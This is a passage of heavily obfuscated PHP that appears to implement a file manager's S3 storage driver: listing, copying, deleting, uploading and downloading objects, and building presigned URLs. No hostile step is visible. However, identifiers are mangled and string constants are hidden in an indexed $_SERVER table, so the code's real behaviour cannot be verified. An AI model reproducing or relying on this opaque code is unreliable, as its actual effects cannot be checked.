ImageThumb::createThumb($§­†è, $ÓüÈ‡ùµ, $Ä¨ÏÌºä, $Ä¨ÏÌºä * 10); if (@file_exists($ÓüÈ‡ùµ)) { Cache::remove($ğ•–ì¸¥); return IO::move($ÓüÈ‡ùµ, $Ë‹³ÕÖ·); } Cache::set($ğ•–ì¸¥, $¯ˆé¾‚[204], 600); del_file($ÓüÈ‡ùµ); return $¯ˆé¾‚[213] . $§­†è . $¯ˆé¾‚[84]; } public function fileOutImageServer($Áªıç€¯, $ëƒä¦¯ = 250) { $this->fileOutImage($Áªıç€¯, $ëƒä¦¯); } public function fileNameAuto($æ‰×Î×¤, $’³Øèµ, $¢ÅÅô« = REPEAT_RENAME, $×Ä×ó¥€ = false) { $ğ‡Ó©í± =& $_SERVER[øşô´çË]; $ìöñìö¬ = $æ‰×Î×¤ === $ğ‡Ó©í±[12] ? $’³Øèµ : rtrim($æ‰×Î×¤, $ğ‡Ó©í±[8]) . $ğ‡Ó©í±[8] . $’³Øèµ; if ($¢ÅÅô« == REPEAT_REPLACE || !$this->exist($ìöñìö¬) || $×Ä×ó¥€ && $¢ÅÅô« != REPEAT_RENAME_FOLDER) { return $’³Øèµ; } if ($¢ÅÅô« == REPEAT_SKIP) { return !1; } $”É”²ø² = $ğ‡Ó©í±[10] . get_path_ext($’³Øèµ); $”É”²ø² = $”É”²ø² == $ğ‡Ó©í±[10] || $×Ä×ó¥€ ? $ğ‡Ó©í±[12] : $”É”²ø²; $ïÕğıŠŞ = 1; $°ÏÔ§ˆ‰ = substr($’³Øèµ, 0, strlen($’³Øèµ) - strlen($”É”²ø²)); $†»Ïò«è = $°ÏÔ§ˆ‰ . "\50{$ïÕğıŠŞ}\51{$”É”²ø²}"; while ($this->exist(rtrim($æ‰×Î×¤, $ğ‡Ó©í±[8]) . $ğ‡Ó©í±[8] . $†»Ïò«è)) { $†»Ïò«è = $°ÏÔ§ˆ‰ . "\x28{$ïÕğıŠŞ}\x29{$”É”²ø²}"; $ïÕğıŠŞ++; } return $†»Ïò«è; } private function fileNameAutoList($ÓÓç†«Ğ, $–œÚÇÆœ, $¾Ü‚”‡Š = false) { $’ïÕß’µ =& $_SERVER[øşô´çË]; $¬ÄçÒ® = $this->listPath($ÓÓç†«Ğ, !0); $¬ÄçÒ® = array_merge($¬ÄçÒ®[$’ïÕß’µ[95]], $¬ÄçÒ®[$’ïÕß’µ[96]]); $°¾“ÍÏÎ = array_to_keyvalue($¬ÄçÒ®, $’ïÕß’µ[12], $’ïÕß’µ[42]); $°úŒ§² = $’ïÕß’µ[10] . get_path_ext($–œÚÇÆœ); $°úŒ§² = $°úŒ§² == $’ïÕß’µ[10] || $¾Ü‚”‡Š ? $’ïÕß’µ[12] : $°úŒ§²; $Äı¢İí­ = substr($–œÚÇÆœ, 0, strlen($–œÚÇÆœ) - strlen($°úŒ§²)); $á§ëÄ¿Ş = $Äı¢İí­ . "\50\x30\x29{$°úŒ§²}"; for ($‡—Ù–§¦ = 1; $‡—Ù–§¦ <= count($°¾“ÍÏÎ) + 1; $‡—Ù–§¦++) { $á§ëÄ¿Ş = $Äı¢İí­ . "\50{$‡—Ù–§¦}\51{$°úŒ§²}"; if (!in_array_not_case($á§ëÄ¿Ş, $°¾“ÍÏÎ)) { return $á§ëÄ¿Ş; } } return $á§ëÄ¿Ş; } public function listAllFiles($«ßıË™, $íÚ­å «) { $‰‡¿†¯ =& $_SERVER[øşô´çË]; if (empty($íÚ­å «)) { return array(); } $’¦À¥ü = array_keys($íÚ­å «); $î‰ÔãÁê = array(); $«ßıË™ = trim($«ßıË™, $‰‡¿†¯[8]); foreach ($íÚ­å « as $¶§îÆ™ => $—íöÂêÎ) { $˜Ô½è¦Á = ltrim(substr(trim($¶§îÆ™, $‰‡¿†¯[8]), strlen($«ßıË™)), $‰‡¿†¯[8]); if (substr($¶§îÆ™, -1) == $‰‡¿†¯[8]) { $˜Ô½è¦Á = rtrim($˜Ô½è¦Á, $‰‡¿†¯[8]) . $‰‡¿†¯[8]; } $î‰ÔãÁê = array_merge($î‰ÔãÁê, $this->slicePath($˜Ô½è¦Á)); } $¼‘âğ¤ = array(); foreach (array_unique($î‰ÔãÁê) as $Êğ÷÷¢§) { $àú«»¼» = array($‰‡¿†¯[97] => $this->getPathOuter($‰‡¿†¯[8] . $«ßıË™ . $‰‡¿†¯[8] . $Êğ÷÷¢§), $‰‡¿†¯[88] => 1, $‰‡¿†¯[89] => 0); if (substr($Êğ÷÷¢§, -1) != $‰‡¿†¯[8]) { $àú«»¼»[$‰‡¿†¯[88]] = 0; $Ëè²¢É = $this->getPath($«ßıË™ . $‰‡¿†¯[8] . $Êğ÷÷¢§); if (isset($íÚ­å «[$Ëè²¢É])) { $³’Ş¼ˆ† = $íÚ­å «[$Ëè²¢É]; if (isset($³’Ş¼ˆ†[$‰‡¿†¯[89]])) { $àú«»¼»[$‰‡¿†¯[89]] = intval($³’Ş¼ˆ†[$‰‡¿†¯[89]]); } if (isset($³’Ş¼ˆ†[$‰‡¿†¯[214]])) { $àú«»¼»[$‰‡¿†¯[98]] = intval($³’Ş¼ˆ†[$‰‡¿†¯[214]]); } } } $¼‘âğ¤[] = $àú«»¼»; } return $¼‘âğ¤; } public function slicePath($®·§ôÇ) { $Ê‚¤îº± =& $_SERVER[øşô´çË]; $…«×™à = explode($Ê‚¤îº±[8], trim($®·§ôÇ, $Ê‚¤îº±[8])); $ñã—®ª½ = 0; do { ++$ñã—®ª½; $ƒ—÷…‘Ë[] = implode($Ê‚¤îº±[8], array_slice($…«×™à, 0, $ñã—®ª½)) . $Ê‚¤îº±[8]; } while ($ñã—®ª½ < count($…«×™à)); $ƒ—÷…‘Ë[count($…«×™à) - 1] = $®·§ôÇ; return $ƒ—÷…‘Ë; } public function getHost() { $‰ïõõÃş =& $_SERVER[øşô´çË]; $Æí…Â“ú = parse_url(trim($this->domain, $‰ïõõÃş[8])); $øÌ¡Öõ = isset($Æí…Â“ú[$‰ïõõÃş[215]]) ? $Æí…Â“ú[$‰ïõõÃş[215]] : http_type(); $ı²›™é¢ = isset($Æí…Â“ú[$‰ïõõÃş[216]]) ? $Æí…Â“ú[$‰ïõõÃş[216]] : $Æí…Â“ú[$‰ïõõÃş[97]]; if (isset($Æí…Â“ú[$‰ïõõÃş[217]])) { $ı²›™é¢ .= $‰ïõõÃş[4] . $Æí…Â“ú[$‰ïõõÃş[217]]; } return $øÌ¡Öõ . $‰ïõõÃş[218] . $ı²›™é¢; } public function pathEncode($ç‘¦”şô) { $–ï¦Ù„ß =& $_SERVER[øşô´çË]; return str_replace($–ï¦Ù„ß[219], $–ï¦Ù„ß[8], rawurlencode($ç‘¦”şô)); } public function writeLog($±Ï¡‚ü¯ = '', $Û€ç¬İˆ = false) { $‚½­²æ =& $_SERVER[øşô´çË]; $ËÓìÕÏ = in_array(ACTION, array($‚½­²æ[220], $‚½­²æ[221])); if (!$ËÓìÕÏ && !GLOBAL_DEBUG) { return; } $›Ìíš» = $±Ï¡‚ü¯; static $½·Ä‡›Œ = null; if (!$½·Ä‡›Œ) { $½·Ä‡›Œ = strtoupper($this->getType()); } $±Ï¡‚ü¯ = $½·Ä‡›Œ . $‚½­²æ[222] . $±Ï¡‚ü¯; if ($Û€ç¬İˆ) { $Æõ©œØ§ = error_get_last(); if ($Æõ©œØ§) { $±Ï¡‚ü¯ = array($±Ï¡‚ü¯, $Æõ©œØ§); } } write_log($±Ï¡‚ü¯, $‚½­²æ[223]); if ($ËÓìÕÏ) { throw new Exception($›Ìíš»); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($œÏ÷Ş„š) { set_timeout(); require_once SDK_DIR . $_SERVER[øşô´çË][224]; parent::__construct(); $this->_init($œÏ÷Ş„š); } public function _init($˜Ë×›ÚÃ) { $·ÆÁüØæ =& $_SERVER[øşô´çË]; $this->config = $˜Ë×›ÚÃ; foreach ($˜Ë×›ÚÃ as $öè€Ï÷ => $ïºÇşãÍ) { if (isset($this->{$öè€Ï÷})) { $this->{$öè€Ï÷} = $ïºÇşãÍ; } } $this->endpoint = $˜Ë×›ÚÃ[$·ÆÁüØæ[225]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $Š‚¨ÑÖ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($Š‚¨ÑÖ, 0, 7) == $·ÆÁüØæ[226]) { $Š‚¨ÑÖ = $·ÆÁüØæ[227] . substr($Š‚¨ÑÖ, 7); } $this->client->setEndpoint($Š‚¨ÑÖ); if (in_array(ACTION, array($·ÆÁüØæ[220], $·ÆÁüØæ[221]))) { $this->client->setExceptions(); } } public function setSignVersion($íâê­ = "\166\64") { $this->signVer = $íâê­; $this->client->setSignVersion($íâê­); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $„€ÎÒòâ) { return null; } } public function isBucketCors() { $Ìõ«°Á =& $_SERVER[øşô´çË]; $¥óª¨ºà = $this->getBucketCors(); if (!$¥óª¨ºà || !is_array($¥óª¨ºà)) { return !1; } if (!is_array($¥óª¨ºà[$Ìõ«°Á[228]])) { $¥óª¨ºà[$Ìõ«°Á[228]] = explode($Ìõ«°Á[60], $¥óª¨ºà[$Ìõ«°Á[228]]); } if ($¥óª¨ºà[$Ìõ«°Á[229]] != $Ìõ«°Á[230] || !in_array($Ìõ«°Á[230], $¥óª¨ºà[$Ìõ«°Á[228]])) { return !1; } $´ù”êçÄ = array_map($Ìõ«°Á[231], $¥óª¨ºà[$Ìõ«°Á[232]]); if (!is_array($´ù”êçÄ)) { $´ù”êçÄ = array(); } $ïßÇ…Ğª = array($Ìõ«°Á[233], $Ìõ«°Á[234], $Ìõ«°Á[235], $Ìõ«°Á[236], $Ìõ«°Á[237]); $ÎìÜ‘êì = array_diff($ïßÇ…Ğª, $´ù”êçÄ); return empty($ÎìÜ‘êì); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function setRegion($¼ëì™üä) { return $this->client->setRegion($¼ëì™üä); } public function mkfile($ä ¡ˆèø, $ÒÀ‹üä = '', $ñ¹íò´ = REPEAT_RENAME) { $¤é”íÀ² = $this->setContent($ä ¡ˆèø, $ÒÀ‹üä); if ($¤é”íÀ² !== !1) { return $this->getPathOuter($ä ¡ˆèø); } return !1; } public function mkdir($“òÅ‡œ, $Û íŒÄ = REPEAT_SKIP) { $Ş‰ ã­ˆ =& $_SERVER[øşô´çË]; if (empty($“òÅ‡œ) && $“òÅ‡œ !== $Ş‰ ã­ˆ[238]) { return !1; } if ($Û íŒÄ && $this->_isFolder($“òÅ‡œ)) { return $this->getPathOuter($“òÅ‡œ); } $¹ÒµÅ‘½ = $this->setContent($“òÅ‡œ, $Ş‰ ã­ˆ[12], !0); if ($¹ÒµÅ‘½ !== !1) { return $this->getPathOuter($“òÅ‡œ); } return !1; } public function copyFile($çÛ»ÌÍã, $´ÅƒßÂ±, $´å›å©€ = array()) { $›ÛÃœ¯÷ =& $_SERVER[øşô´çË]; $Š•¯†»• = $this->objectMeta($çÛ»ÌÍã); if (!$Š•¯†»•) { return !1; } if ($Š•¯†»•[$›ÛÃœ¯÷[89]] <= 1024 * 1024 * 200) { $´ƒŠâ‚ = $this->client->copyObject($this->bucket, $çÛ»ÌÍã, $this->bucket, $´ÅƒßÂ±, $›ÛÃœ¯÷[239], $´å›å©€); } else { $´ƒŠâ‚ = $this->client->multiCopyObject($this->bucket, $çÛ»ÌÍã, $this->bucket, $´ÅƒßÂ±, $´å›å©€); } $´ƒŠâ‚ = $´ƒŠâ‚ ? $this->getPathOuter($´ÅƒßÂ±) : !1; return $´ƒŠâ‚; } public function moveFile($«¿‚ÅÃ½, $µƒ¥Ş) { if ($this->copyFile($«¿‚ÅÃ½, $µƒ¥Ş)) { $this->delFile($«¿‚ÅÃ½); return $this->getPathOuter($µƒ¥Ş); } return !1; } public function delFile($ú¢ÍÎ½¨) { return $this->client->deleteObject($this->bucket, $ú¢ÍÎ½¨); } public function delFolder($òİ÷Ú‹½) { $©ş¦Ì·Ó =& $_SERVER[øşô´çË]; if (!$this->exist($òİ÷Ú‹½)) { return !0; } $this->listItemCache = !1; $ÄÃäû´‡ = $this->fileList($òİ÷Ú‹½); $this->listItemCache = !0; $œ‡¢Ÿ¹ = trim($òİ÷Ú‹½, $©ş¦Ì·Ó[8]) . $©ş¦Ì·Ó[8]; if (!empty($òİ÷Ú‹½) && $òİ÷Ú‹½ !== $©ş¦Ì·Ó[238] && !in_array($œ‡¢Ÿ¹, $ÄÃäû´‡[$©ş¦Ì·Ó[95]])) { $ÄÃäû´‡[$©ş¦Ì·Ó[95]][] = $œ‡¢Ÿ¹; } $÷¤¥ ë = $this->delByBatch($ÄÃäû´‡[$©ş¦Ì·Ó[96]]); if (!$÷¤¥ ë) { return !1; } $÷¤¥ ë = $this->delByBatch($ÄÃäû´‡[$©ş¦Ì·Ó[95]]); if (!$÷¤¥ ë) { return !1; } return $this->delFile($œ‡¢Ÿ¹); } private function delByBatch($ÂÎÇ¦Õ­) { foreach (array_chunk($ÂÎÇ¦Õ­, 1000) as $Ïë÷¬ø) { $¯¼—ùÔØ = $this->client->deleteObjects($this->bucket, $Ïë÷¬ø); if (!$¯¼—ùÔØ) { return !1; } } return !0; } public function rename($®•åõªÀ, $«¯³ãÛÕ) { return $this->renameObject($®•åõªÀ, $«¯³ãÛÕ); } public function listPath($¸ï‹Å³, $İ…©ÛºÈ = false) { $õö¨ã•ı =& $_SERVER[øşô´çË]; $ìÍëÆØ = $this->fileList($¸ï‹Å³, $õö¨ã•ı[8], !0); foreach ($ìÍëÆØ[$õö¨ã•ı[95]] as $¶Ö×ïÔš => $€Üè³µ¨) { $ìÍëÆØ[$õö¨ã•ı[95]][$¶Ö×ïÔš] = $this->folderInfo($€Üè³µ¨, $İ…©ÛºÈ, $€Üè³µ¨); } foreach ($ìÍëÆØ[$õö¨ã•ı[96]] as $¶Ö×ïÔš => $€Üè³µ¨) { $ìÍëÆØ[$õö¨ã•ı[96]][$¶Ö×ïÔš] = $this->fileInfo($€Üè³µ¨[$õö¨ã•ı[42]], $İ…©ÛºÈ, $€Üè³µ¨); } return $ìÍëÆØ; } protected function infoChildren($±¤§ë¢ü, &$ ‘©ÌšÎ) { $øÔ—™Ìú =& $_SERVER[øşô´çË]; $¬õçöì× = $this->fileList($±¤§ë¢ü, $øÔ—™Ìú[12], !0); $ ‘©ÌšÎ[$øÔ—™Ìú[91]] += count($¬õçöì×[$øÔ—™Ìú[95]]); $ ‘©ÌšÎ[$øÔ—™Ìú[90]] += count($¬õçöì×[$øÔ—™Ìú[96]]); foreach ($¬õçöì×[$øÔ—™Ìú[96]] as $İÏ×¸¸§) { if (!$İÏ×¸¸§ || !$İÏ×¸¸§[$øÔ—™Ìú[89]]) { continue; } $ ‘©ÌšÎ[$øÔ—™Ìú[89]] += $İÏ×¸¸§[$øÔ—™Ìú[89]]; } } private function fileInfo($Òú…É†™, $É±¦óŠ = false, $§£¡ï = array()) { $©§óïˆÎ =& $_SERVER[øşô´çË]; $ÉÌ®¿ = array($©§óïˆÎ[42] => $this->pathThis($Òú…É†™), $©§óïˆÎ[97] => $this->getPathOuter($Òú…É†™), $©§óïˆÎ[43] => $©§óïˆÎ[240], $©§óïˆÎ[176] => $this->ext($Òú…É†™), $©§óïˆÎ[89] => isset($§£¡ï[$©§óïˆÎ[89]]) ? $§£¡ï[$©§óïˆÎ[89]] : 0); if ($É±¦óŠ) { return $ÉÌ®¿; } $ÉÌ®¿[$©§óïˆÎ[241]] = $ÉÌ®¿[$©§óïˆÎ[98]] = 0; $ÉÌ®¿[$©§óïˆÎ[242]] = $ÉÌ®¿[$©§óïˆÎ[243]] = !0; if (empty($§£¡ï)) { $§£¡ï = $this->objectMeta($Òú…É†™); if (!$§£¡ï) { return $ÉÌ®¿; } } if (isset($§£¡ï[$©§óïˆÎ[244]]) && $§£¡ï[$©§óïˆÎ[244]]) { $ÉÌ®¿[$©§óïˆÎ[245]] = $§£¡ï[$©§óïˆÎ[244]]; } if (isset($§£¡ï[$©§óïˆÎ[214]])) { $ÉÌ®¿[$©§óïˆÎ[98]] = $§£¡ï[$©§óïˆÎ[214]]; } if (isset($§£¡ï[$©§óïˆÎ[89]])) { $ÉÌ®¿[$©§óïˆÎ[89]] = $§£¡ï[$©§óïˆÎ[89]]; } return $ÉÌ®¿; } private function folderInfo($Â©”ô‡, $´‰ºÂ¯© = false, $‹ûĞ¸½ = array()) { $¨ö™†ğÃ =& $_SERVER[øşô´çË]; $¼Ÿ­“ìï = array($¨ö™†ğÃ[42] => $this->pathThis($Â©”ô‡), $¨ö™†ğÃ[97] => $this->getPathOuter($¨ö™†ğÃ[8] . $Â©”ô‡), $¨ö™†ğÃ[43] => $¨ö™†ğÃ[88]); if ($´‰ºÂ¯©) { return $¼Ÿ­“ìï; } $¼Ÿ­“ìï[$¨ö™†ğÃ[241]] = $¼Ÿ­“ìï[$¨ö™†ğÃ[98]] = 0; $¼Ÿ­“ìï[$¨ö™†ğÃ[242]] = $¼Ÿ­“ìï[$¨ö™†ğÃ[243]] = !0; if ($Â©”ô‡ == $¨ö™†ğÃ[12]) { return $¼Ÿ­“ìï; } if (empty($‹ûĞ¸½)) { $‹ûĞ¸½ = $this->objectMeta(trim($Â©”ô‡, $¨ö™†ğÃ[8]) . $¨ö™†ğÃ[8]); } if (isset($‹ûĞ¸½[$¨ö™†ğÃ[214]])) { $¼Ÿ­“ìï[$¨ö™†ğÃ[241]] = $‹ûĞ¸½[$¨ö™†ğÃ[214]]; } return $¼Ÿ­“ìï; } private function fileList($¥¥ô­ºš, $åÄµß÷¯ = '', $íœßîá¶ = 0) { $Èšêåã =& $_SERVER[øşô´çË]; $Œ‡Šµö = rtrim($¥¥ô­ºš, $Èšêåã[8]) . $Èšêåã[8]; $ìæ¾½Ğ° = $this->listObjs($Œ‡Šµö, null, null, $åÄµß÷¯); if (!$ìæ¾½Ğ°) { return array($Èšêåã[95] => array(), $Èšêåã[96] => array()); } $¾ˆŸÑÅ = $¬“•‰® = array(); foreach ($ìæ¾½Ğ°[$Èšêåã[246]] as $ø¶éšŞö) { $ÆŞÊÏáÎ = $ø¶éšŞö[$Èšêåã[42]]; if ($ÆŞÊÏáÎ == $Œ‡Šµö) { continue; } $„²ÂÉÁ = isset($ø¶éšŞö[$Èšêåã[89]]) ? $ø¶éšŞö[$Èšêåã[89]] : 0; $Ù» ‹ùĞ = $„²ÂÉÁ == 0 && substr($ÆŞÊÏáÎ, strlen($ÆŞÊÏáÎ) - 1, 1) == $Èšêåã[8] ? !0 : !1; $this->cacheMethodInfoSet($ÆŞÊÏáÎ, $Ù» ‹ùĞ, $ø¶éšŞö); if ($Ù» ‹ùĞ) { $¾ˆŸÑÅ[] = $ÆŞÊÏáÎ; continue; } $¬“•‰®[] = $íœßîá¶ ? $ø¶éšŞö : $ÆŞÊÏáÎ; } foreach ($ìæ¾½Ğ°[$Èšêåã[247]] as $ø¶éšŞö) { $¾ˆŸÑÅ[] = $ø¶éšŞö[$Èšêåã[42]]; $this->cacheMethodInfoSet($ø¶éšŞö[$Èšêåã[42]], !0); } $this->cacheMethodInfoSet($¥¥ô­ºš, !0); return array($Èšêåã[95] => $¾ˆŸÑÅ, $Èšêåã[96] => $¬“•‰®); } private function listObjs($¾¿àİÁÒ, $ÀŸ¶Ì•± = null, $Ğ“Ïñ É = null, $¡ğÈ € = null) { $ßƒö§ =& $_SERVER[øşô´çË]; $¾¿àİÁÒ = trim($¾¿àİÁÒ, $ßƒö§[8]); $¤¤¼±ã¦ = empty($¾¿àİÁÒ) && $¾¿àİÁÒ !== $ßƒö§[238] ? $ßƒö§[12] : $¾¿àİÁÒ . $ßƒö§[8]; return $this->client->getBucket($this->bucket, $¤¤¼±ã¦, $ÀŸ¶Ì•±, $Ğ“Ïñ É, $¡ğÈ €, !0); } public function has($µş¯æÃõ, $šşƒÏØ¤ = false, $«†õ¢™š = true) { $Ö†¿èä =& $_SERVER[øşô´çË]; $µş¯æÃõ = trim($µş¯æÃõ, $Ö†¿èä[8]); $°©Çà£Ë = empty($µş¯æÃõ) && $µş¯æÃõ !== $Ö†¿èä[238] ? $Ö†¿èä[12] : $µş¯æÃõ . $Ö†¿èä[8]; $òêêÕÌ— = null; $‘æ¥æ€ = 500; $™Ï€±ô = $Ö†¿èä[8]; $õ–ËíÜ = $½ïÏ­†¿ = array(); while (!0) { $ôŠ¥æî„ = $this->listObjs($µş¯æÃõ, $òêêÕÌ—, $‘æ¥æ€, $™Ï€±ô); if (!$ôŠ¥æî„) { break; } $òêêÕÌ— = $ôŠ¥æî„[$Ö†¿èä[248]]; $ñ¸æÃ = $ôŠ¥æî„[$Ö†¿èä[246]]; $Íöœá³ø = $ôŠ¥æî„[$Ö†¿èä[247]]; if (empty($ñ¸æÃ) && empty($Íöœá³ø)) { break; } if (count($ñ¸æÃ) == 1 && $ñ¸æÃ[0][$Ö†¿èä[42]] == $°©Çà£Ë) { break; } if ($šşƒÏØ¤) { if (count($ñ¸æÃ)) { $ñ¸æÃ = array_column($ñ¸æÃ, $Ö†¿èä[42]); $õ–ËíÜ = array_merge($õ–ËíÜ, $ñ¸æÃ); } if (count($Íöœá³ø)) { $Íöœá³ø = array_column($Íöœá³ø, $Ö†¿èä[42]); $½ïÏ­†¿ = array_merge($½ïÏ­†¿, $Íöœá³ø); } if ($òêêÕÌ— === null) { break; } continue; } if ($«†õ¢™š) { if (!empty($ñ¸æÃ)) { if (count($ñ¸æÃ) > 1 || isset($ñ¸æÃ[0][$Ö†¿èä[42]]) && $ñ¸æÃ[0][$Ö†¿èä[42]] != $°©Çà£Ë) { return !0; } } } else { if (!empty($Íöœá³ø)) { return !0; } } if ($òêêÕÌ— === null) { break; } } if ($šşƒÏØ¤) { $õ–ËíÜ = array_diff($õ–ËíÜ, array($°©Çà£Ë)); $õ–ËíÜ = count(array_unique($õ–ËíÜ)); $½ïÏ­†¿ = count(array_unique($½ïÏ­†¿)); return array($Ö†¿èä[249] => $õ–ËíÜ, $Ö†¿èä[250] => $½ïÏ­†¿); } return !1; } public function listAll($³³åûÇ’) { $Ÿç€º … =& $_SERVER[øşô´çË]; $‰‘…ˆÚì = $this->fileList($³³åûÇ’, $Ÿç€º …[12], !0); $É‚§ªµë = array_to_keyvalue($‰‘…ˆÚì[$Ÿç€º …[96]], $Ÿç€º …[42]); foreach ($‰‘…ˆÚì[$Ÿç€º …[95]] as $“¼öŸûä) { if (is_string($“¼öŸûä)) { $É‚§ªµë[$“¼öŸûä] = array($Ÿç€º …[89] => 0); } } return $this->listAllFiles($³³åûÇ’, $É‚§ªµë); } public function canRead($³éô™†¬) { $ş¯”ş¤æ =& $_SERVER[øşô´çË]; $˜ñˆí’¥ = $this->client->getAccessControlPolicy($this->bucket, $³éô™†¬); if (!$˜ñˆí’¥) { return !1; } return in_array($˜ñˆí’¥, array($ş¯”ş¤æ[251], $ş¯”ş¤æ[252], $ş¯”ş¤æ[253])) ? !0 : !1; } public function canWrite($İ÷÷ááÕ) { $Ûğ›Äö =& $_SERVER[øşô´çË]; $Í®ˆõÉË = $this->client->getAccessControlPolicy($this->bucket, $İ÷÷ááÕ); if (!$Í®ˆõÉË) { return !1; } return in_array($Í®ˆõÉË, array($Ûğ›Äö[251], $Ûğ›Äö[252])) ? !0 : !1; } public function getContent($‰‘öí”Ê) { return $this->client->getObject($this->bucket, $‰‘öí”Ê); } public function setContent($¬©›«µ˜, $‡²¯­¢– = '', $ïáÅ¡Şà = false) { $‹àîó°Õ =& $_SERVER[øşô´çË]; $¬©›«µ˜ = $ïáÅ¡Şà ? trim($¬©›«µ˜, $‹àîó°Õ[8]) . $‹àîó°Õ[8] : $¬©›«µ˜; $Ø—Úìö» = get_file_mime(get_path_ext($¬©›«µ˜)); $¸Æ¸–¯€ = $this->client->putObject($‡²¯­¢–, $this->bucket, $¬©›«µ˜, $‹àîó°Õ[239], array(), $Ø—Úìö»); if (!$¸Æ¸–¯€) { return !1; } if ($ïáÅ¡Şà) { return !0; } return $¸Æ¸–¯€ ? !0 : !1; } public function fileSubstr($É¯£õ„Ö, $üÛåÓÁ, $Äåœ¼Å­) { $ÍÔÆà = $üÛåÓÁ + $Äåœ¼Å­ - 1; return $this->client->getObject($this->bucket, $É¯£õ„Ö, array($_SERVER[øşô´çË][254] => "\x62\171\x74\x65\163\75{$üÛåÓÁ}\55{$ÍÔÆà}")); } public function upload($µÊğé§, $—“ÉÃ¨, $ÁçµÂãù = false, $Îï¢âÍ¡ = REPEAT_REPLACE) { $ñ†Íò¶ë =& $_SERVER[øşô´çË]; if (!$—“ÉÃ¨ || !@file_exists($—“ÉÃ¨)) { return !1; } $™Ö†â×› = array($ñ†Íò¶ë[255] => @md5_file($—“ÉÃ¨)); $ñåï©‡ = array($ñ†Íò¶ë[256] => get_file_mime(get_path_ext($µÊğé§))); if (IO::size($—“ÉÃ¨) <= 1024 * 1024 * 200) { $´ƒáê™ä = $this->client->putObjectFile($—“ÉÃ¨, $this->bucket, $µÊğé§, $ñ†Íò¶ë[239], $™Ö†â×›, $ñåï©‡); return !empty($´ƒáê™ä) ? $this->getPathOuter($µÊğé§) : !1; } $¡ÉäÈİŒ = $this->client->multiUploadObject($—“ÉÃ¨, $this->bucket, trim($µÊğé§, $ñ†Íò¶ë[8]), $™Ö†â×›, $ñåï©‡); return $¡ÉäÈİŒ ? $this->getPathOuter($µÊğé§) : !1; } public function download($Ïüôîö, $³ó×¿°³) { if (!@is_dir($this->pathFather($³ó×¿°³)) && !IO::mkdir($this->pathFather($³ó×¿°³))) { return !1; } $ø×áš× = $this->client->getObject($this->bucket, $Ïüôîö, array(), $³ó×¿°³); return $ø×áš× !== !1 ? $³ó×¿°³ : !1; } public function link($¼úŸĞ¿ñ, $öÙÒÏ¦ = array()) { return $this->getPreSignedURL($¼úŸĞ¿ñ, 3600 * 12, $öÙÒÏ¦); } private function getPreSignedURL($À—Œˆ¼¥, $½×‚úÕ, $Ÿ¼˜Ÿ = array(), $…ßçÂ—“ = "\107\105\x54") { $‡ƒ˜úü½ =& $_SERVER[øşô´çË]; $À—Œˆ¼¥ = trim($À—Œˆ¼¥, $‡ƒ˜úü½[8]); if ($this->signVer == $‡ƒ˜úü½[257]) { return $this->client->getPreSignedV2URL($this->bucket, $À—Œˆ¼¥, $½×‚úÕ, $…ßçÂ—“, $Ÿ¼˜Ÿ); } return $this->client->getPreSignedV4URL($this->bucket, $À—Œˆ¼¥, $½×‚úÕ, array(), $…ßçÂ—“, $Ÿ¼˜Ÿ); } public function fileOut($ğÜÁ£‰Û, $›Ç¢Ù¾ = false, $Ğ©†Ö“Ö = false, $æ­îò¡ = '') { $éÃÀÆ¿” =& $_SERVER[øşô´çË]; if ($this->isFileOutServer()) { return $this->fileOutServer($ğÜÁ£‰Û, $›Ç¢Ù¾, $Ğ©†Ö“Ö, $æ­îò¡); } if (!$Ğ©†Ö“Ö) { $Ğ©†Ö“Ö = $this->pathThis($ğÜÁ£‰Û); } $Ş ¼ä¯Ğ = get_file_mime(get_path_ext($Ğ©†Ö“Ö)); if ($Ş ¼ä¯Ğ == $éÃÀÆ¿”[258]) { return parent::fileOut($ğÜÁ£‰Û, $›Ç¢Ù¾, $Ğ©†Ö“Ö, $æ­îò¡); } $·ÌÂß±â = array($éÃÀÆ¿”[259] => $Ş ¼ä¯Ğ); if ($›Ç¢Ù¾) { $·ÌÂß±â[$éÃÀÆ¿”[260]] = $éÃÀÆ¿”[261] . rawurlencode($Ğ©†Ö“Ö); } else { } $İ‡—£“ = $this->link($ğÜÁ£‰Û, $·ÌÂß±â); $this->fileOutLink($İ‡—£“); } public function fileOutServer($‚»Ö®Ş, $µâËÔœŒ = false, $•£Û»şù = false, $ôôÈëÉ— = '') { parent::fileOut($‚»Ö®Ş, $µâËÔœŒ, $•£Û»şù, $ôôÈëÉ—); } public function fileOutImageServer($Û”©Ö©¿, $»èÃÁå¥ = 250) { parent::fileOutImage($Û”©Ö©¿, $»èÃÁå¥); } public function fileOutLink($”ÇëÑˆª) { $ÂØ†íöé =& $_SERVER[øşô´çË]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ÂØ†íöé[77], $ÂØ†íöé[76], $ÂØ†íöé[78])) && !get_url_scheme($this->endpoint) && substr($”ÇëÑˆª, 0, 7) == $ÂØ†íöé[226]) { $”ÇëÑˆª = $ÂØ†íöé[227] . substr($”ÇëÑˆª, 7); } header($ÂØ†íöé[182] . $”ÇëÑˆª); die; } public function hashMd5($¢áì·Ğ‘, $ñµî—€É = '') { $á×üğí¹ = $this->objectMeta($¢áì·Ğ‘); if (!$á×üğí¹) { return !1; } $ñµî—€É = $ñµî—€É ? $ñµî—€É : _get($á×üğí¹, $_SERVER[øşô´çË][262]); return $ñµî—€É; } public function uploadFormData($ì¢†Ÿµè, $è©»±Ïâ = 3600) { $øúñÀºß =& $_SERVER[øşô´çË]; if (!$this->_isClientAsync()) { $ğ¹”ïÏ¬ = $this->getPreSignedURL($ì¢†Ÿµè, $è©»±Ïâ, array(), $øúñÀºß[263]); return array($øúñÀºß[216] => str_replace($øúñÀºß[226], $øúñÀºß[264], $ğ¹”ïÏ¬)); } if (isset($GLOBALS[$øúñÀºß[6]][$øúñÀºß[102]][$øúñÀºß[265]]) && 